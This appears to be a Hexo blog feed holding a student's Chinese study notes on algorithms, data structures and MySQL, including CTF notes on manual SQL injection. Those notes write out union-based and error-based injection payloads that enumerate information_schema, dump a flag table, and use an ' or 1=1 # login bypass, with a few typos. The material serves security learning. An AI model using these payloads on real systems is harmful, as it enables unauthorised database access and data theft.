        <content type="html"><![CDATA[<h1 id="adduser"><a href="#adduser" class="headerlink" title="adduser"></a>adduser</h1><ol><li>root</li><li>普通 home</li><li>访客 <h2 id="访客不能切到root"><a href="#访客不能切到root" class="headerlink" title="访客不能切到root"></a>访客不能切到root</h2></li><li>出于系统保护</li></ol><h1 id="区分文件和文件夹"><a href="#区分文件和文件夹" class="headerlink" title="区分文件和文件夹"></a>区分文件和文件夹</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>背包问题</title>
      <link href="/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/"/>
      <url>/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="宗旨：在背包可以容纳的情况下，最多可以实现的价值是多少"><a href="#宗旨：在背包可以容纳的情况下，最多可以实现的价值是多少" class="headerlink" title="宗旨：在背包可以容纳的情况下，最多可以实现的价值是多少"></a>宗旨：在背包可以容纳的情况下，最多可以实现的价值是多少</h1><h1 id="01背包问题"><a href="#01背包问题" class="headerlink" title="01背包问题"></a>01背包问题</h1><h2 id="N个物品和容量为U的背包"><a href="#N个物品和容量为U的背包" class="headerlink" title="N个物品和容量为U的背包"></a>N个物品和容量为U的背包</h2><h2 id="v来表示体积，w来表示价值"><a href="#v来表示体积，w来表示价值" class="headerlink" title="v来表示体积，w来表示价值"></a>v来表示体积，w来表示价值</h2><ol><li>每件物品仅用一次<h3 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h3></li><li>在背包可以容纳的情况下，可以实现的最大价值是多少</li><li>dp要从两个方面来考虑：</li><li>状态表示：f(i,j):即为价值的最大值      即需要考虑需要多少维度来表示</li><li>状态计算：（如何一步一步地把状态计算出来）；状态划分</li></ol><h2 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h2><ol><li>只从前i个物品中选</li><li>总体积 &lt;= j</li></ol><h1 id="完全背包"><a href="#完全背包" class="headerlink" title="完全背包"></a>完全背包</h1><h2 id="每件物品有无限个"><a href="#每件物品有无限个" class="headerlink" title="每件物品有无限个"></a>每件物品有无限个</h2><h1 id="多重背包问题"><a href="#多重背包问题" class="headerlink" title="多重背包问题"></a>多重背包问题</h1><h2 id="每个物品的个数不同"><a href="#每个物品的个数不同" class="headerlink" title="每个物品的个数不同"></a>每个物品的个数不同</h2><h1 id="分组背包问题"><a href="#分组背包问题" class="headerlink" title="分组背包问题"></a>分组背包问题</h1><h2 id="物品有N组，每一组中有若干个，一组之中只能选一个物品"><a href="#物品有N组，每一组中有若干个，一组之中只能选一个物品" class="headerlink" title="物品有N组，每一组中有若干个，一组之中只能选一个物品"></a>物品有N组，每一组中有若干个，一组之中只能选一个物品</h2>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
          <category> 背包问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
            <tag> 背包问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>n的二进制表示中第k位数字是几</title>
      <link href="/n%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA%E4%B8%AD%E7%AC%ACk%E4%BD%8D%E6%95%B0%E5%AD%97%E6%98%AF%E5%87%A0/"/>
      <url>/n%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA%E4%B8%AD%E7%AC%ACk%E4%BD%8D%E6%95%B0%E5%AD%97%E6%98%AF%E5%87%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="n的二进制表示中第k位数字是几"><a href="#n的二进制表示中第k位数字是几" class="headerlink" title="n的二进制表示中第k位数字是几"></a>n的二进制表示中第k位数字是几</h1><ol><li>先把第k位数字移到最后一位 n&gt;&gt;k</li><li>看个位是几 x&amp;1<h2 id="除以2相当于二进制数右移1位"><a href="#除以2相当于二进制数右移1位" class="headerlink" title="除以2相当于二进制数右移1位"></a>除以2相当于二进制数右移1位</h2></li><li>即右移1位相当于除以2，相当于除去二进制数中的下一位<h2 id="按位与操作："><a href="#按位与操作：" class="headerlink" title="按位与操作："></a>按位与操作：</h2></li><li>相当于取出某一位</li><li>int a = 1010</li><li>a &amp; 1 = 0</li><li>a &amp; 11 = 2  (10的二进制表示为2)</li></ol><h1 id="lowbit操作"><a href="#lowbit操作" class="headerlink" title="lowbit操作"></a>lowbit操作</h1><ol><li>lowbit(x)是返回x的最后一位1</li><li>相当于x&amp;-x=x&amp;(~x+1)</li></ol>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据元素</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%85%83%E7%B4%A0%EF%BC%9A/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%85%83%E7%B4%A0%EF%BC%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="数据元素："><a href="#数据元素：" class="headerlink" title="数据元素："></a>数据元素：</h1><ol><li>数据的基本单位，在计算机程序中通常作为一个整体进行考虑和处理<br>2， 也简称为元素，node结点<h1 id="数据项"><a href="#数据项" class="headerlink" title="数据项"></a>数据项</h1>1， 构成数据元素的不可分割的最小单位</li></ol><h1 id="数据对象"><a href="#数据对象" class="headerlink" title="数据对象"></a>数据对象</h1><ol><li>性质相同的数据元素的集合</li></ol><h1 id="关系："><a href="#关系：" class="headerlink" title="关系："></a>关系：</h1><ol><li>数据&gt;数据元素 &gt; 数据项</li><li>整个数据&gt;node&gt; value</li></ol><h1 id="数据结构："><a href="#数据结构：" class="headerlink" title="数据结构："></a>数据结构：</h1><ol><li>数据元素互相之间的关系称为结构<br>2，互相之间存在的一种或多种特定关系的数据元素集合 </li></ol><h1 id="数据结构的三方面内容"><a href="#数据结构的三方面内容" class="headerlink" title="数据结构的三方面内容"></a>数据结构的三方面内容</h1><ol><li>逻辑结构</li><li>数据元素和其关系在内存中的表示（映像），物理结构或数据的存储结构</li><li>数据的运算和实现，对数据元素可以施加的操作和这些操作</li></ol><h1 id="逻辑结构的种类："><a href="#逻辑结构的种类：" class="headerlink" title="逻辑结构的种类："></a>逻辑结构的种类：</h1><h2 id="直接分法："><a href="#直接分法：" class="headerlink" title="直接分法："></a>直接分法：</h2><ol><li>线性结构：有且只有一个开始和一个终端节点，并且所有节点都最多只有一个直接前驱和一个直接后继</li><li>非线性结构：一个节点可能有多个直接前驱和直接后驱：树和图（多对多）<h2 id="四类基本逻辑结构："><a href="#四类基本逻辑结构：" class="headerlink" title="四类基本逻辑结构："></a>四类基本逻辑结构：</h2></li><li>集合：除了同属于一个集合外无其它关系</li><li>线性：结构中数据元素之间存在一对一的关系</li><li>树：一对多的关系</li><li>图：多对多的网状关系</li></ol><h1 id="四种基本的存储结构："><a href="#四种基本的存储结构：" class="headerlink" title="四种基本的存储结构："></a>四种基本的存储结构：</h1><ol><li>顺序存储结构：用一组连续的存储单元依次存储数据元素，数据结构之间的逻辑关系由元素的存储位置来实现</li><li>链接存储结构：<br>用一组任意的存储单元存储数据元素，数据元素之间的逻辑关系用指针来实现</li><li>索引存储结构：在存储节点信息的同时还建立附加的索引表</li><li>散列存储结构：根据结点的刮泥机案子直接计算出该节点的存储地址</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构</title>
      <link href="/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><h2 id="链表和邻接表"><a href="#链表和邻接表" class="headerlink" title="链表和邻接表"></a>链表和邻接表</h2><ol><li>struct Node{<br> int val;<br> Node *next;<br>}<br> new Node()</li><li>数组模拟链表：<h3 id="数组模拟单链表："><a href="#数组模拟单链表：" class="headerlink" title="数组模拟单链表："></a>数组模拟单链表：</h3></li><li>用的最多的是邻接表：存储图和树</li><li>空指针的为-1</li><li>优化某些问题</li><li>e<a href="%E7%94%A8%E6%9D%A5%E5%AD%98%E5%82%A8value">N</a>和ne<a href="%E7%94%A8%E6%9D%A5%E5%AD%98%E5%82%A8%E4%B8%8B%E4%B8%80%E4%B8%AA%E8%8A%82%E7%82%B9%E7%9A%84%E4%BD%8D%E7%BD%AE">N</a><br>3， 空节点的下标用-1来表示</li><li><a href="https://imgtu.com/i/b0GXJe"><img src="https://s4.ax1x.com/2022/03/05/b0GXJe.md.png" alt="b0GXJe.md.png"></a><h3 id="数组模拟双链表："><a href="#数组模拟双链表：" class="headerlink" title="数组模拟双链表："></a>数组模拟双链表：</h3></li><li>和单链表的区别在于双链表节点的指针一个指向前，另一个指向后</li></ol><h2 id="栈与队列"><a href="#栈与队列" class="headerlink" title="栈与队列"></a>栈与队列</h2><ol><li>栈是先进后出，类似于只有一端开口的羽毛球筒</li><li>队列是先进先出，类似于两端开口的羽毛球筒<h3 id="单调栈："><a href="#单调栈：" class="headerlink" title="单调栈："></a>单调栈：</h3></li><li>遍历</li><li>找到左边离它最近且比它小的数在什么地方（返回的是那个数）</li><li>找到右边离它最近且比它大的数在什么地方（返回的是那个数）</li><li>不存在返回-1</li><li>3   4    2   7   5</li><li>-1  3   -1   2   2</li><li>把所有逆序的点全部删去，就可以得到一个严格按照升序排列的数</li></ol><h2 id="kmp"><a href="#kmp" class="headerlink" title="kmp"></a>kmp</h2><h3 id="暴力："><a href="#暴力：" class="headerlink" title="暴力："></a>暴力：</h3><p>S[N],p[M];<br>for(int i = 1;i &lt;= n;i++){<br>    bool flag = true;<br>    for(int j = 1;j &lt;= m;j++){<br>        if(s[i] != p[j]){<br>            flag = false;<br>            break;<br>        }<br>    }<br>}</p><h3 id="如何优化："><a href="#如何优化：" class="headerlink" title="如何优化："></a>如何优化：</h3><h1 id="节点的插入操作："><a href="#节点的插入操作：" class="headerlink" title="节点的插入操作："></a>节点的插入操作：</h1><h2 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h2><h3 id="共同点："><a href="#共同点：" class="headerlink" title="共同点："></a>共同点：</h3><ol><li>e[idx] = x; 最先将元素插进去</li><li>ne[idx] = head/ne[k] idx的下一个为head和k</li><li>ne[k]/head = idx</li><li>idx++<h2 id="最后输出"><a href="#最后输出" class="headerlink" title="最后输出"></a>最后输出</h2></li><li>for(int i = head;i != -1;i = ne[i]) cout &lt;&lt; e[i] &lt;&lt; ‘ ‘;</li></ol><h2 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h2><h3 id="插入操作："><a href="#插入操作：" class="headerlink" title="插入操作："></a>插入操作：</h3><ol><li>e[idx] = x; 给idx为下标的地方赋值</li><li>l[idx] = k; idx的位置在k的右边（k在idx的后面，idx的下一个为k）</li><li>r[idx] = r[k]; 将idx的下一个位置指向原本k的下一个位置</li><li>l[r[k]] = idx; 将k+1的位置的点左指针指向idx位置</li></ol>]]></content>
      
      
      <categories>
          
          <category> acm算法 </category>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm算法 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql手动注入语法</title>
      <link href="/%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5/"/>
      <url>/%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="对information-shcema的理解"><a href="#对information-shcema的理解" class="headerlink" title="对information_shcema的理解"></a>对information_shcema的理解</h1><ol><li>shcema可以看作是房间</li><li>table_schema是用来存放table表的房间，是数据库</li><li>table_name是表的名字</li><li>table_type是表的类型</li></ol><h1 id="对group-concat和concat-ws的理解"><a href="#对group-concat和concat-ws的理解" class="headerlink" title="对group_concat和concat_ws的理解"></a>对group_concat和concat_ws的理解</h1><ol><li>group_concat可以将多行数据整合为一行</li><li>concat可以将不同数据用第一个参数链接</li><li>可以写group_concat(concat_ws(‘:’,id,email_id))</li></ol><h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><h2 id="判断是否有注入点"><a href="#判断是否有注入点" class="headerlink" title="判断是否有注入点"></a>判断是否有注入点</h2><ol><li>1 and 1=1正确</li><li>1 and 1=2不正确，所以可以判断是整数型注入<h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2></li><li>order by 1,2,3,4….</li><li>可以使用二分法来判断</li><li>为下一步联合查询爆数据库名奠定基础</li></ol><h2 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h2><ol><li>?id=1 and 1=2 union select 1.database()</li><li>注意此处联合查询需要前后字段数量一致，且字段数与上一步使用order by 判断的一致</li><li><a href="https://imgtu.com/i/HgvkKf"><img src="https://s4.ax1x.com/2022/02/15/HgvkKf.md.png" alt="HgvkKf.md.png"></a></li></ol><h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><ol><li>?id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_name= ‘sqli’</li><li>group_concat()函数是用来将多行转为一行</li><li>table_name</li><li>information_schema.tables</li></ol><h2 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h2><ol><li>?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=’flag’</li><li>column_name</li><li>information_schema.columns</li><li>table_name</li></ol><h2 id="查询flag"><a href="#查询flag" class="headerlink" title="查询flag"></a>查询flag</h2><ol><li>?id=1 and 1=2 union select 1,group_concat(flag) from sqli.flag</li><li>根据库中的表来查询所有的列中带flag的</li><li><a href="https://imgtu.com/i/HgvAr8"><img src="https://s4.ax1x.com/2022/02/15/HgvAr8.md.png" alt="HgvAr8.md.png"></a></li></ol><h1 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h1><h2 id="判断能否根据输入的不同结果不同"><a href="#判断能否根据输入的不同结果不同" class="headerlink" title="判断能否根据输入的不同结果不同"></a>判断能否根据输入的不同结果不同</h2><ol><li>输入1，2，3…看是否有不同的数据<h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2></li><li>1 and 1=1;和1 and 1=2都没错</li><li>1’ and 1=1 –+ 没有问题</li><li>1’ and 1=2 –+报错</li><li>报错是爆出语法错误</li><li>后面加上–+是为了产生闭合，屏蔽掉后面的多余单引号</li></ol><h2 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h2><ol><li>?id=1’ order by 2 没问题</li><li>?id=1’ order by 3 有问题</li></ol><h2 id="爆数据库名-1"><a href="#爆数据库名-1" class="headerlink" title="爆数据库名"></a>爆数据库名</h2><ol><li>?id=1’ and 1=2 union select 1,database() –+</li><li>得到数据库名为sqli</li></ol><h2 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h2><ol><li>?id=1’ and 1=2 union select 1,group_concat(concat_ws(‘:’,table_name)) from information_schema.tables where table_name=’flag’ –+</li></ol><h2 id="爆字段内容"><a href="#爆字段内容" class="headerlink" title="爆字段内容"></a>爆字段内容</h2><ol><li>?id=1’ and 1=2 union select 1,group_conat(concat_ws(‘:’,flag)) from sqli.flag</li><li><a href="https://imgtu.com/i/H2sSTH"><img src="https://s4.ax1x.com/2022/02/15/H2sSTH.md.png" alt="H2sSTH.md.png"></a></li></ol><h3 id="buuctf中的warmup"><a href="#buuctf中的warmup" class="headerlink" title="buuctf中的warmup"></a>buuctf中的warmup</h3><ol><li>输入1和1’来判断是字符型还是数字型，发现是字符型注入</li><li>使用1’ or 1=1 #来万能绕过</li></ol><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><ol><li>extractvalue():从目标xml中返回包含所查询的字符串</li><li>EXTRACTVALUE(XML_document,XPath_string)</li><li>第一个参数：XML_document是String格式，为XML文档对象的名称</li><li>第二个参数：Xpath_string(xpath格式的字符串)</li><li>concat:返回结果为连接参数产生的字符串</li></ol><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><ol><li>updatexml(xml_document,xpath_string,new_value)</li><li>第一个参数：xml_document是string格式，为xml文档对象的名称</li><li>第二个参数：xpath_string</li><li>第三个参数：new_value,string格式，替换查找到符合条件的数据</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> sql注入 </category>
          
          <category> 手动注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 手动注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入的基本原理</title>
      <link href="/%E6%AF%94%E8%B5%9B%E5%BF%85%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/"/>
      <url>/%E6%AF%94%E8%B5%9B%E5%BF%85%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="比赛必看sql注入"><a href="#比赛必看sql注入" class="headerlink" title="比赛必看sql注入"></a>比赛必看sql注入</h1><h2 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ol><li>用order by后面拼接数字，确定字段数量，如果大于，则页面错误或无内容，若小于或等于，则页面正常，若错误页和正常页一样，更换报错注入/盲注</li><li>可以使用二分法来判断列的数量<h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3></li><li>判断页面回显数据的字段位置，使用union select 1,2,3```定义的数字显示在页面上，即可从中判断页面显示的字段位置<h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3></li><li>在显示的字段位置使用子查询来查询数据，或直接查询也可</li></ol><h2 id="单引号闭合问题"><a href="#单引号闭合问题" class="headerlink" title="单引号闭合问题"></a>单引号闭合问题</h2><ol><li>加入执行的语句为select * from admin where ‘$id’</li><li>如果id = 1 and 1 = 2</li><li>则会有select * from admin where ‘1 and 1 = 2’,1=2被当作字符串处理</li><li>如果id = 1’ and 1=2–+</li><li>则会有select * from admin where ‘1’ and 1=2 –+’ 闭合了，然后注释掉后面多余的单引号<h2 id="当id-1’时，数字型和单引号包裹的字符型都会报错，但是双引号包裹不会报错"><a href="#当id-1’时，数字型和单引号包裹的字符型都会报错，但是双引号包裹不会报错" class="headerlink" title="当id=1’时，数字型和单引号包裹的字符型都会报错，但是双引号包裹不会报错"></a>当id=1’时，数字型和单引号包裹的字符型都会报错，但是双引号包裹不会报错</h2></li></ol><h2 id="判断是否有注入"><a href="#判断是否有注入" class="headerlink" title="判断是否有注入"></a>判断是否有注入</h2><ol><li>可控参数(id)的改变能否影响页面显示结果</li><li>输入的SQL语句是否能报错-能通过数据库的报错，看到数据库的一些语句痕迹</li><li>输入的SQL语句能否不报错-我们的语句能否成功闭合<h3 id="-3"><a href="#-3" class="headerlink" title=""></a></h3></li><li>?id=</li></ol><h2 id="判断是什么类型的注入"><a href="#判断是什么类型的注入" class="headerlink" title="判断是什么类型的注入"></a>判断是什么类型的注入</h2><h2 id="判断语句是否能够被恶意修改"><a href="#判断语句是否能够被恶意修改" class="headerlink" title="判断语句是否能够被恶意修改"></a>判断语句是否能够被恶意修改</h2><h2 id="是否能够成功执行"><a href="#是否能够成功执行" class="headerlink" title="是否能够成功执行"></a>是否能够成功执行</h2><h2 id="获取我们想要的数据"><a href="#获取我们想要的数据" class="headerlink" title="获取我们想要的数据"></a>获取我们想要的数据</h2><h3 id="-4"><a href="#-4" class="headerlink" title=""></a></h3><p>数据都是保存在数据库中-》表-》字段-》值</p><h2 id="mysql自带的表"><a href="#mysql自带的表" class="headerlink" title="mysql自带的表"></a>mysql自带的表</h2><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information schema"></a>information schema</h3><ol><li>information_schema这张数据表保存了所有MYSQL服务器所有数据库的信息，例如数据库名，数据库的表，表栏的数据类型和访问权限。</li><li>schemata：提供了关于数据库的信息</li><li>tables：给出了关于数据库中表的信息</li><li>column：表中列的信息</li><li>STATISTICS表：给出了关于表索引的信息。</li><li>USER_PRIVILEGES表：给出了关于全程权限的信息。该信息源自mysql.user授权表。</li><li><img src="https://s2.loli.net/2022/05/09/2hpCTjqRuEYcDBG.png"></li><li>SCHEMA_PRIVILEGES表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。</li><li><img src="https://s2.loli.net/2022/05/09/SMJ2fB4GNZYVAHx.png"></li><li>TABLE_PRIVILEGES表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。</li><li><img src="https://s2.loli.net/2022/05/09/LTyYzAmUPCSJXgs.png"></li><li>COLUMN_PRIVILEGES表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。</li><li>TABLE_CONSTRAINTS表：描述了存在约束的表。</li><li>KEY_COLUMN_USAGE表：描述了具有约束的键列。</li><li>VIEWS表：给出了关于数据库中的视图的信息。</li><li><a href="https://blog.csdn.net/zhang_jgang/article/details/50819142">https://blog.csdn.net/zhang_jgang/article/details/50819142</a><h4 id="information-schema中的操作"><a href="#information-schema中的操作" class="headerlink" title="information schema中的操作"></a>information schema中的操作</h4></li><li>查看库中所有的表，表名等：select * from information_schema.tables</li></ol>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
          <category> CTF </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ing </tag>
            
            <tag> CTF </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql操作</title>
      <link href="/mysql%E6%93%8D%E4%BD%9C/"/>
      <url>/mysql%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql操作"><a href="#mysql操作" class="headerlink" title="mysql操作"></a>mysql操作</h1><h2 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h2><h3 id="本质上是说这类数据库有多张表，通过关系彼此关联"><a href="#本质上是说这类数据库有多张表，通过关系彼此关联" class="headerlink" title="本质上是说这类数据库有多张表，通过关系彼此关联"></a>本质上是说这类数据库有多张表，通过关系彼此关联</h3><h2 id="sys是Mysql自己内部运行用的数据库"><a href="#sys是Mysql自己内部运行用的数据库" class="headerlink" title="sys是Mysql自己内部运行用的数据库"></a>sys是Mysql自己内部运行用的数据库</h2><h2 id="shemas"><a href="#shemas" class="headerlink" title="shemas"></a>shemas</h2><h1 id="着重号的使用："><a href="#着重号的使用：" class="headerlink" title="着重号的使用："></a>着重号的使用：</h1><ol><li>区分字段和关键字</li><li>例如：NAME本身是关键字，加``着重号后会变色，便于区分</li></ol><h3 id="tables"><a href="#tables" class="headerlink" title="tables"></a>tables</h3><ol><li>存储数据的地方<h4 id="点击最右侧的表格图标"><a href="#点击最右侧的表格图标" class="headerlink" title="点击最右侧的表格图标"></a>点击最右侧的表格图标</h4></li><li>显示出的数据每一行为一个数据，用id来唯一区分<h3 id="views"><a href="#views" class="headerlink" title="views"></a>views</h3></li><li>视图，将不同表的数据组合到一起<h3 id="stored-procedures"><a href="#stored-procedures" class="headerlink" title="stored procedures"></a>stored procedures</h3></li><li>存   储过程</li><li>用来查询数据<h3 id="functions"><a href="#functions" class="headerlink" title="functions"></a>functions</h3></li><li>函数</li><li>存储再数据库里的项目<h2 id="码风"><a href="#码风" class="headerlink" title="码风"></a>码风</h2></li><li>大写mysql关键字，小写其余内容</li></ol><h2 id="button"><a href="#button" class="headerlink" title="button"></a>button</h2><ol><li>Query中的execute是执行所有的sql</li></ol><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><h3 id="use"><a href="#use" class="headerlink" title="use"></a>use</h3><ol><li>调用数据库，类似与py中的import和c++中的include<h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3></li><li>指名想要明确获取的列</li><li>*代表所有列</li></ol><h2 id="查询常量值："><a href="#查询常量值：" class="headerlink" title="查询常量值："></a>查询常量值：</h2><ol><li>select 100;</li><li>select “name”;mysql中不区分字符和字符串的概念<h2 id="查询表达式："><a href="#查询表达式：" class="headerlink" title="查询表达式："></a>查询表达式：</h2></li><li>select 100*9;<h2 id="查询函数："><a href="#查询函数：" class="headerlink" title="查询函数："></a>查询函数：</h2></li><li>select VERSION()</li><li>调用该函数得到它的返回值</li></ol><h2 id="逻辑顺序："><a href="#逻辑顺序：" class="headerlink" title="逻辑顺序："></a>逻辑顺序：</h2><ol><li>先用from找到表</li><li>where走筛选</li><li>最后select走查询<h3 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h3></li><li>指名想要查询的表</li><li>select * from some_table：先库后id最后table</li><li>和py中的from random import choice 有异曲同工之处<h1 id="调用大小级关系"><a href="#调用大小级关系" class="headerlink" title="调用大小级关系"></a>调用大小级关系</h1></li><li>调用库用USE</li><li>调用列用select</li><li>调用table用FROM<h1 id="select语句"><a href="#select语句" class="headerlink" title="select语句"></a>select语句</h1></li><li>选择某一列</li><li>先后顺序根据参数的前后顺序决定</li><li>DISTINCT为消除重复项（列中参数的重复项）<h1 id="where语句"><a href="#where语句" class="headerlink" title="where语句"></a>where语句</h1></li><li>日期参数默认是year-month-date：四位year,两位month,两位date</li></ol><h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h2><ol><li>使用条件表达式筛选：条件运算符：&gt; &lt; = != &lt;&gt; &lt;= &gt;=</li><li>按照逻辑表达式筛选：逻辑运算符：&amp;&amp; || ! and or not </li><li>模糊查询：like; between and; in; is null;</li></ol><h2 id="参数：and-；not；-or；in-between-like-regexp"><a href="#参数：and-；not；-or；in-between-like-regexp" class="headerlink" title="参数：and ；not； or；in;between;like,regexp"></a>参数：and ；not； or；in;between;like,regexp</h2><h3 id="参数特点："><a href="#参数特点：" class="headerlink" title="参数特点："></a>参数特点：</h3><ol><li><h4 id="not"><a href="#not" class="headerlink" title="not"></a>not</h4></li><li> WHERE NOT(ID != 10 AND CountryCode = “AFG”)即可产生ID != 10 AND CountryCode = “AFG”的反面<h4 id="in"><a href="#in" class="headerlink" title="in"></a>in</h4></li><li>in:简化or的写法，即WHERE Name = a OR Name = b OR Name = c == WHERE Name IN (‘a’,’b’,’c’);字符型的值必须使用单引号引起来；当某一位为下划线的时候’_’</li><li>in列表的值类型必须统一</li><li>相当于=，不能用通配符’%’和’_’<h4 id="between-and"><a href="#between-and" class="headerlink" title="between and"></a>between and</h4></li><li>between:当要将一个属性同一个范围值相比较简化AND的写法：WHERE points &gt;= 1000 AND points &lt;= 3000 == WHERE points BETWEEN 1000 AND 3000(闭区间取值);两个临界值不能颠倒（先大于等于，后小于等于）<h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4></li><li>LIKE:%表示any number of characters;_表示single character<h4 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h4></li><li>REGEXP:regular expression(正则表达式)，用异或^来表示字符串开头，用美元$来表示字符串末尾，用|来表示多个寻找，用[‘]’来表示下一个字符从某个列表中寻找，在[]中用-来表示从哪到哪（a-h即为abcdefgh）<h4 id="null"><a href="#null" class="headerlink" title="null"></a>null</h4></li><li>null不能够使用=和&lt;&gt;</li><li>ifnull(exp1,exp2):当exp1为null时将返回exp2,否则将返回exp1</li></ol><h1 id="正则表达式："><a href="#正则表达式：" class="headerlink" title="正则表达式："></a>正则表达式：</h1><ol><li>^ beginning</li><li>$ end</li><li>| logical or</li><li>[abcd] any choice</li><li>[a-f] surrounding</li><li>&lt;=&gt; 安全等于，既可以用Null和数值等于</li></ol><h1 id="schemas中的每一个table的设置"><a href="#schemas中的每一个table的设置" class="headerlink" title="schemas中的每一个table的设置"></a>schemas中的每一个table的设置</h1><ol><li>第一行带黄色感叹号的是这张表的主键列，每一个table中都有一个</li></ol><h1 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h1><ol><li>排序，例：SELECT Name,CountryCode FROM city ORDER BY 1,2(即Name,CountryCode)</li><li>即将按照Name先排序，后按照CountryCode进行排序</li><li>asc是升序排序</li><li>desc是降序排序</li><li>SELECT * FROM employees ORDER BY salary DESC;</li><li>SELECT * FROM employees ORDER BY salary ASC;(asc可以省略)</li></ol><h1 id="limit-n"><a href="#limit-n" class="headerlink" title="limit n"></a>limit n</h1><ol><li>返回前n项<h2 id="offset-偏移量"><a href="#offset-偏移量" class="headerlink" title="offset(偏移量)"></a>offset(偏移量)</h2></li><li>limit m,n:跳过前m项数据后获取n条记录</li></ol><h1 id="内链接：同一个库中不同表格的链接"><a href="#内链接：同一个库中不同表格的链接" class="headerlink" title="内链接：同一个库中不同表格的链接"></a>内链接：同一个库中不同表格的链接</h1><ol><li>联合记录：on语句，例：JOIN customers ON orders.customer_id = customers.customer_id</li><li>加表格名前缀使列可以用，防止ambigous</li><li>使用别名避免重复，紧跟在每个表后使用别名<h1 id="跨数据库链接：不同数据库之间的链接"><a href="#跨数据库链接：不同数据库之间的链接" class="headerlink" title="跨数据库链接：不同数据库之间的链接"></a>跨数据库链接：不同数据库之间的链接</h1></li><li>未使用USE的数据库记得加上前缀</li></ol><h2 id="为字段起别名"><a href="#为字段起别名" class="headerlink" 